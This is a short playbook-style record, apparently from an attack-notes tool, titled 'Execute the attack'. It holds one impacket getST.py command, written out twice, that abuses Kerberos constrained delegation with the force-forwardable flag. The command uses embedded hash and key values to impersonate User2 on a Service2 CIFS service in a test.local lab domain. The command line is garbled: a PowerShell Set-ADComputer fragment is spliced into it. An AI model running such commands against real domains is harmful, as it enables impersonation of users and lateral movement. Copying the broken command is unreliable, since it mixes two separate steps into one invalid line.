---
id: a4a39705-230c-4825-a34b-bd5f2bd1dcd5
name: Execute the attack
type: command
executor: bash
data: python .\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate
  User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5
  -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService
  -force-forwardableet-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
output: null
created_at: '2023-04-06T03:56:07.952203+00:00'
updated_at: '2023-04-10T20:26:20.679788+00:00'
---

# Execute the attack

```bash
python .\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardableet-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
```


